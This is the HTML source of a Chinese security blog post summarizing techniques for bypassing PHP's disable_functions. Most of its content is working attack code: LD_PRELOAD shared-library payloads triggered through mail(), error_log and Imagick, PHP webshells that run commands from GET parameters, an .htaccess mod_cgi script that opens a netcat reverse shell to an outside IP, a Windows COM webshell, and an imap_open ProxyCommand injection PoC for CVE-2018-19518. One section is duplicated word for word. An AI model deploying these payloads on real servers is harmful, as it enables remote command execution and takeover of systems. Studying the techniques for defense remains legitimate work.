@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>bypass-disfunction ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">bypass-disfunction</p>
+            <br>
+            
+            <p>Friday, February 7th 2020, 1:38 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在PHP中的disabled_functions主要是用于禁用一些危险的函数防止攻击者执行系统命令。但是有一些绕过方法。这里做个总结。</p>
+<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>网上常见的有几种绕过的方法：</p>
+<ul>
+<li>寻找未禁用的漏洞函数，来尝试执行命令。比如：popen()、proc_open()、pcntl_exec()，imap_open()等等。</li>
+<li>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</li>
+<li>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制</li>
+<li>攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞</li>
+</ul>
+<h2 id="LD-PRELOAD-劫持系统函数"><a href="#LD-PRELOAD-劫持系统函数" class="headerlink" title="LD_PRELOAD 劫持系统函数"></a>LD_PRELOAD 劫持系统函数</h2><p>什么是LD_PRELOAD</p>
+<pre><code>LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
+</code></pre><p>简单来说：LD_PRELOAD 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。<br>其实现方式是通过在其它动态链接库之前提前被加载了我们构造的恶意动态链接库。</p>
+<p>利用方式：</p>
+<ul>
+<li>生成一个恶意动态链接库文件</li>
+<li>利用<code>putenv</code>设置<code>LD_PRELOAD</code>为恶意动态链接库文件的路径</li>
+<li>配合php的某个函数去触发我们的恶意动态链接库文件</li>
+<li><p>执行命令</p>
+<p>这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。</p>
+</li>
+</ul>
+<p>其中有不少函数可以满足，比如<code>mail</code>、<code>error_log</code></p>
+<h3 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h3><p>我们发现mail()函数可以使用，而mail()函数执行默认是会调用外部程序sendmail的，看一下php.ini就会发现默认调用<code>sendmail -t -i</code>。<br>该如何利用呢？<br>先编写我们的恶意动态链接库 a.c文件：</p>
+<pre><code class="html">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() {
+        system(&quot;ls &gt; test.txt&quot;);
+}   
+int  geteuid() {
+if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+unsetenv(&quot;LD_PRELOAD&quot;);
+payload();
+}
+</code></pre>
+<p>然后生成我们的动态链接程序</p>
+<pre><code class="html">gcc -c -fPIC a.c -o a
+
+gcc -shared a -o a.so
+</code></pre>
+<p>然后编写php脚本mail.php</p>
+<pre><code class="html">文件名： main.php
+&lt;?php
+putenv(&quot;LD_PRELOAD=./a.so&quot;);
+mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;
+</code></pre>
+<p>访问main.php<br>可以发现成执行了我们的命令，把命令结果写到了test.txt中了。</p>
+<pre><code>➜  test ls
+a  a.c  a.so  index.php  main.php  test.txt
+➜  test cat test.txt
+a
+a.c
+a.so
+index.php
+main.php
+test.txt
+➜  test
+</code></pre><h3 id="error-log"><a href="#error-log" class="headerlink" title="error_log"></a>error_log</h3><p>当mail函数被ban了，可以使用<code>error_log</code>。</p>
+<p><img src="https://s2.ax1x.com/2020/02/07/1gtuZT.png" alt="1gtuZT.png"><br>当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址</p>
+<p><code>error_log</code>调用的过程中（当type为1时）和mail函数一样，是调用sendmail命令。</p>
+<p>动态链接库文件同上</p>
+<p>error_log.php文件</p>
+<pre><code class="html">&lt;?php
+putenv(&quot;LD_PRELOAD=./a.so&quot;);
+error_log(&quot;test&quot;,1,&quot;&quot;,&quot;&quot;);
+?&gt;
+</code></pre>
+<h2 id="无需劫持函数，加载动态链接库即能执行"><a href="#无需劫持函数，加载动态链接库即能执行" class="headerlink" title="无需劫持函数，加载动态链接库即能执行"></a>无需劫持函数，加载动态链接库即能执行</h2><p>如果系统没有安装sendmail或者禁用了，上面的办法就无法再使用了。不过有大师傅发现不劫持特定函数也能执行命令。<a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">参考</a></p>
+<pre><code>GCC 有个 C 语言扩展修饰符 **attribute**((constructor))，可以让由它修饰的函数在 main()
+之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 **attribute**((constructor)) 修饰的函数。
+</code></pre><p>那么此时，我们将动态库payload改为如下：</p>
+<pre><code>#define _GNU_SOURCE
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+
+extern char** environ;
+
+__attribute__ ((__constructor__)) void preload (void)
+{
+    // get command line options and arg
+    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);
+
+    // unset environment variable LD_PRELOAD.
+    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some 
+    // distribution (e.g., centos), I need crafty trick.
+    int i;
+    for (i = 0; environ[i]; ++i) {
+            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) {
+                    environ[i][0] = &#39;\0&#39;;
+            }
+    }
+
+    // executive command
+    system(cmdline);
+}
+</code></pre><p>编译：</p>
+<pre><code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so
+</code></pre><p>要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
+<p>对应的php文件：</p>
+<pre><code>&lt;?php
+    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;
+
+    $cmd = $_GET[&quot;cmd&quot;];
+    $out_path = $_GET[&quot;outpath&quot;];
+    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;
+    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;
+
+    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);
+
+    $so_path = $_GET[&quot;sopath&quot;];
+    putenv(&quot;LD_PRELOAD=&quot; . $so_path);
+
+    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);
+
+    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; 
+
+    unlink($out_path);
+?&gt;
+</code></pre><p>利用：<br><img src="https://s2.ax1x.com/2020/02/07/1g2AWq.png" alt="1g2AWq.png"></p>
+<p><strong>注意</strong></p>
+<ul>
+<li>不同目标环境可能需要重新编译共享对象</li>
+<li>bypass_disablefunc.php 需要对 outpath 指定的路径具有读写权限</li>
+</ul>
+<p>这里面所需要的文件：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">参考链接</a></p>
+<h2 id="利用ImageMagick漏洞绕过"><a href="#利用ImageMagick漏洞绕过" class="headerlink" title="利用ImageMagick漏洞绕过"></a>利用ImageMagick漏洞绕过</h2><p>当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件</p>
+<pre><code>wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp
+</code></pre><p> 配合<code>__attribute__</code>函数</p>
+<pre><code>__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数
+
+__attribute__语法格式为：__attribute__ ( ( attribute-list ) )
+若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：
+</code></pre><p>我们可以知道当该函数为<code>__attribute__((__constructor__))</code>的时候，会在main（）函数执行之前被自动的执行</p>
+<p>所以我们尝试构造imagick.c</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;ls &gt; test&quot;);
+}
+</code></pre><p>然后生成我们的动态链接程序</p>
+<pre><code>gcc -c -fPIC imagick.c -o imagick
+gcc --share imagick -o imagick.so
+</code></pre><p>img.php</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=./imagick.so&quot;);
+$img = new Imagick(&#39;img.mp4&#39;);        //img.mp4文件必须存在，否则就会不去调用ffmpeg
+?&gt;
+</code></pre><p>运行一波，发现我们的命令执行成功了</p>
+<h2 id="apache-mod-cgi模式"><a href="#apache-mod-cgi模式" class="headerlink" title="apache mod_cgi模式"></a>apache mod_cgi模式</h2><p>Liunx 下php有三种运行模式。apache handler、CGI、和上面提到的FastCGI。而这种攻击要求的就是具体在apache服务器的情况下，CGI模式才可以。</p>
+<p>CGI模式下，每接受一个用户请求，apache都会fork一个进程运行CGI程序解析php脚本，在.htaccess中我们设置允许在web目录运行CGI程序，然后上传一个shell命令文件上去，执行就可以反弹一个shell了。</p>
+<p>要求：</p>
+<ul>
+<li>apache且运行mod_cgi模式</li>
+<li>web目录可写</li>
+<li>允许.htaccess生效</li>
+</ul>
+<p>在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。</p>
+<p>有师傅已经写好的payload:</p>
+<pre><code>&lt;?php
+$cmd = &quot;nc -c &#39;/bin/bash&#39; 172.16.15.1 4444&quot;; //command to be executed
+$shellfile = &quot;#!/bin/bash\n&quot;; //using a shellscript
+$shellfile .= &quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //header is needed, otherwise a 500 error is thrown when there is output
+$shellfile .= &quot;$cmd&quot;; //executing $cmd
+function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
+{
+    echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;\n&quot;;
+}
+if (!isset($_GET[&#39;checked&#39;]))
+{
+    @file_put_contents(&#39;.htaccess&#39;, &quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
+    header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;] . &#39;?checked=true&#39;); //execute the script again to see if the htaccess test worked
+}
+else
+{
+    $modcgi = in_array(&#39;mod_cgi&#39;, apache_get_modules()); // mod_cgi enabled?
+    $writable = is_writable(&#39;.&#39;); //current dir writable?
+    $htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]); //htaccess enabled?
+        checkEnabled(&quot;Mod-Cgi enabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;Is writable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;htaccess working&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
+    if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))
+    {
+        echo &quot;Error. All of the above must be true for the script to work!&quot;; //abort if not
+    }
+    else
+    {
+        checkEnabled(&quot;Backing up .htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded! Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); //make a backup, cause you never know.
+        checkEnabled(&quot;Write .htaccess file&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //.dizzle is a nice extension
+        checkEnabled(&quot;Write shell file&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //write the file
+        checkEnabled(&quot;Chmod 777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //rwx
+        echo &quot;Executing the script now. Check your listener &lt;img src = &#39;shell.dizzle&#39; style = &#39;display:none;&#39;&gt;&quot;; //call the script
+    }
+}
+?&gt;
+</code></pre><h2 id="系统组件绕过"><a href="#系统组件绕过" class="headerlink" title="系统组件绕过"></a>系统组件绕过</h2><p>window com组件(php 5.4)(高版本扩展要自己添加）<br>条件：要在php.ini中开启<br><img src="https://s2.ax1x.com/2020/02/07/12kURH.png" alt="12kURH.png"><br>这样就是开启了。<br>将shell上传到服务器：</p>
+<pre><code>&lt;?php
+$command=$_GET[&#39;a&#39;];
+$wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象　Shell.Application也能
+$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command); //调用对象方法来执行命令
+$stdout = $exec-&gt;StdOut();
+$stroutput = $stdout-&gt;ReadAll();
+echo $stroutput;
+?&gt;
+</code></pre><p>可以执行命令：<br><img src="https://s2.ax1x.com/2020/02/07/12k2WQ.png" alt="12k2WQ.png"></p>
+<h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open()"></a>imap_open()</h2><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p>
+<p>因为ssh命令中可以通过设置<code>-o ProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+<p>CVE-2018-19518的环境可以直接使用vulhub上的环境：<a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518" target="_blank" rel="noopener">链接</a></p>
+<p>POC:</p>
+<pre><code>&lt;?php
+$exp = &quot;echo `ls` &gt; /tmp/test&quot;;
+$base64_exp = base64_encode($exp);
+$server = &quot;x -oProxyCommand=echo\t${base64_exp}|base64\t-d|sh}&quot;;
+imap_open(&#39;{&#39;.$server.&#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;) or die(&quot;\n\nError: &quot;.imap_last_error());
+?&gt;
+</code></pre><p>发现能够执行命令：<br><img src="https://s2.ax1x.com/2020/02/07/12l8eg.png" alt="12l8eg.png"></p>
+<h2 id="利用ImageMagick漏洞绕过-1"><a href="#利用ImageMagick漏洞绕过-1" class="headerlink" title="利用ImageMagick漏洞绕过"></a>利用ImageMagick漏洞绕过</h2><p>当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件</p>
+<pre><code>wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp
+</code></pre><p> 配合<code>__attribute__</code>函数</p>
+<pre><code>__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数
+
+__attribute__语法格式为：__attribute__ ( ( attribute-list ) )
+若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：
+</code></pre><p>我们可以知道当该函数为<code>__attribute__((__constructor__))</code>的时候，会在main（）函数执行之前被自动的执行</p>
+<p>所以我们尝试构造imagick.c</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;ls &gt; test&quot;);
+}
+</code></pre><p>然后生成我们的动态链接程序</p>
+<pre><code>gcc -c -fPIC imagick.c -o imagick
+gcc --share imagick -o imagick.so
+</code></pre><p>img.php</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=./imagick.so&quot;);
+$img = new Imagick(&#39;img.mp4&#39;);        //img.mp4文件必须存在，否则就会不去调用ffmpeg
+?&gt;
+</code></pre><p>运行一波，发现我们的命令执行成功了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些是我知道的一些绕过的方法，感觉学习安全还是要上手实践，不能只是看看。总结下来会有新的收获。<br>本文如有不妥之处，敬请斧正。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/4623" target="_blank" rel="noopener">Bypass disabled_functions一些思路总结</a><br><a href="https://blog.szfszf.top/tech/php%E7%BB%95%E8%BF%87disable_function-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E8%B7%B5/" target="_blank" rel="noopener">PHP绕过disable_function 总结与实践</a><br><a href="https://xz.aliyun.com/t/5320" target="_blank" rel="noopener">PHP Webshell下绕过disable_function的方法</a></p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;web安全</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
